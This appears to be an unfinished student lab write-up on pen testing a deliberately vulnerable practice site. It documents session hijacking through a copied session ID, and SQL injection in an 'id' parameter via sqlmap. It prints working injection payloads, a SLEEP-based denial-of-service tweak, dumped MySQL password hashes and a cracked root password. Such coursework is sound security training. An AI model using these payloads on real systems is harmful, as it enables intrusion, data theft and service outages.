## Pen Testing Live Targets

Time spent: 25 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:

* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each color is vulnerable to only 2 of the 6 possible exploits. First discover which color has the specific vulnerability, then write a short description of how to exploit it, and finally demonstrate it using screenshots compiled into a GIF.

## Blue

Vulnerability #1: Session Hijacking

Description: 

The Session Hijacking attack consists of the exploitation of the web session control mechanism, which is normally managed for a session token.

Because http communication uses many different TCP connections, the web server needs a method to recognize every user’s connections. The most useful method depends on a token that the Web Server sends to the client browser after a successful client authentication. A session token is normally composed of a string of variable width and it could be used in different ways, like in the URL, in the header of the http requisition as a cookie,

How to document and recreate this exploit:

1- First visit https://104.198.208.81/blue/public/staff/login.php and login using the pperson credentials. 
2- Then go to https://104.198.208.81/blue/public/hacktools/change_session_id.php to see your current PHPSESSIONID, store that information for later. 
3- Open another browser such as Firefox or Chrome and visit https://104.198.208.81/blue/public/hacktools/change_session_id.php, copy the authenticated PHPSESSIONID to replace the your Session ID. 
4- Next visit https://104.198.208.81/blue/public/login.php, you should see that you are already logged in. 
5- We successfully bypassed authentication.

![Session Hijacking Exploit](https://user-images.githubusercontent.com/111711434/200113050-d1337254-f6f5-4351-b27f-76912f7a5866.gif)


Vulnerability #2: Exploit # 2 - SQL Injections

Description: 

How to document and recreate this exploit:

1- First visit https://104.198.208.81/blue/public/staff/login.php and login using the pperson credentials. 
2- Then head on over to URL https://104.198.208.81/blue/public/salesperson.php?id=1 
3- Using BurpSuite, GET request file as a TXT file. We will feed this information to a tool called SQLMap with the following parameter: sqlmap -r /home/kali/sqlmal-dev/request.txt -a (the -a parameter will return EVERYTHING, at times not recommended)
4- SQLMap detects a vulnerability in the 'id=' field and provides us with three SQL injections:
	
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=3' AND 2971=2971 AND 'bcTH'='bcTH
    
    Comments after testing: Returned the information for another user, see below:
    
    Irene Boling
    555-736-2301
    iboling@salesperson.com

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=3' AND (SELECT 8396 FROM (SELECT(SLEEP(5)))PBWw) AND 'pCMl'='pCMl

    Comments after testing: Changed (SlEEP(5))))PBWw) to SLEEP(200000))))PBWw and it created a Denial of Service for the time   set. 
![Denial of Service after SQL injection  ](https://user-images.githubusercontent.com/111711434/200140448-3da3ba36-f3b6-4bcf-a079-b24d6592906c.png)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-8495' UNION ALL SELECT CONCAT(0x716b766a71,0x6b544944475a6778655979637a6558776b595163416a567459494a735864556b4f55666875547352,0x7171717a71),NULL,NULL,NULL,NULL-- -

Comments after testing: Redirects back to the 'Find a Salesperson' web page.

The scan revelead the following information that can further assist us:

Web Server OS : Linux Ubuntu 16.04 or 16.10
Web App Technology: Apache 2.4.18 server
MySQL version: 5.0.12
 Databases:  
[INFO] fetching database names
[INFO] resumed: 'globitek_blue'
[INFO] resumed: 'information_schema'
[INFO] resumed: 'globitek_blue'
[INFO] resumed: 'globitek_green'
[INFO] resumed: 'globitek_red'
[INFO] resumed: 'mysql'
[INFO] resumed: 'performance_schema'
[INFO] resumed: 'sys'

Database management users:                                                                                                                                                                                                     
[*] 'debian-sys-maint'@'localhost'
[*] 'mysql.session'@'localhost'
[*] 'mysql.sys'@'localhost'
[*] 'root'@'localhost'


Moreover, SQLMap also located & revealed the following password hashes:

[INFO] fetching database users password hashes
[INFO] resumed: 'root','*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19'
[INFO] resumed: 'mysql.sys','*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
[INFO] resumed: 'debian-sys-maint','*7B88B3A98617F2ED6B4EB4F48AEAD4E1416C359C'
[INFO] resumed: 'mysql.session','*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'


Using the integrated dictionary-based password cracker (mysql_passwd) the password for root was found:

database management system users password hashes:                                                                                                                                                                                           
[*] debian-sys-maint [1]:
    password hash: *7B88B3A98617F2ED6B4EB4F48AEAD4E1416C359C
[*] mysql.session [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] mysql.sys [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] root [1]:
    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    clear-text password: password

Description: 

## Green

Vulnerability #1: User Enumaration 

Description:

<img src="green-vuln1.gif">


## Red

Vulnerability #1: __________________

Description:

<img src="red-vuln1.gif">


## Notes

Describe any challenges encountered while doing the work
